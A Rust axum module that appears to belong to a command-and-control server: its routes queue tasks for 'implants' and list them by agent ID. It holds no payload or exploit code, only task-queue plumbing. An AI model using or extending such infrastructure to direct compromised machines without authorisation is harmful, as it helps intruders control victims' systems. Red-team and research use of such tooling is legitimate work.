use crate::core::implants::parse_agent_id;
use crate::state::AppState;
use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use serde::Deserialize;
use serde_json::json;

pub fn routes(state: AppState) -> Router {
    Router::new()
        .route("/api/tasks", post(queue_task))
        .route("/api/tasks/{id}", get(get_task))
        .route("/api/implants/{id}/tasks", get(list_implant_tasks))
        .with_state(state)
}

#[derive(Deserialize)]
struct QueueTaskRequest {
    agent_id: String,
    task_type: u8,
    #[serde(default)]
    data: String,
}

async fn queue_task(
    State(state): State<AppState>,
    Json(req): Json<QueueTaskRequest>,
) -> impl IntoResponse {
    let agent_id = match parse_agent_id(&req.agent_id) {
        Ok(id) => id,
        Err(e) => return (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
    };

    let data_bytes = if req.data.is_empty() {
        Vec::new()
    } else {
        req.data.as_bytes().to_vec()
    };

    match state.tasks.enqueue(&agent_id, req.task_type, &data_bytes) {
        Ok(task_id) => (
            StatusCode::CREATED,
            Json(json!({ "task_id": task_id, "status": "pending" })),
        ),
        Err(e) => (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
    }
}

async fn get_task(
    State(state): State<AppState>,
    Path(id): Path<i64>,
) -> impl IntoResponse {
    match state.tasks.get(id) {
        Ok(Some(task)) => (StatusCode::OK, Json(json!(task))),
        Ok(None) => (StatusCode::NOT_FOUND, Json(json!({ "error": "not found" }))),
        Err(e) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(json!({ "error": e })),
        ),
    }
}

async fn list_implant_tasks(
    State(state): State<AppState>,
    Path(id): Path<String>,
) -> impl IntoResponse {
    let agent_id = match parse_agent_id(&id) {
        Ok(id) => id,
        Err(e) => return (StatusCode::BAD_REQUEST, Json(json!({ "error": e }))),
    };
    match state.tasks.list_for_implant(&agent_id) {
        Ok(tasks) => (StatusCode::OK, Json(json!({ "tasks": tasks }))),
        Err(e) => (
            StatusCode::INTERNAL_SERVER_ERROR,
            Json(json!({ "error": e })),
        ),
    }
}
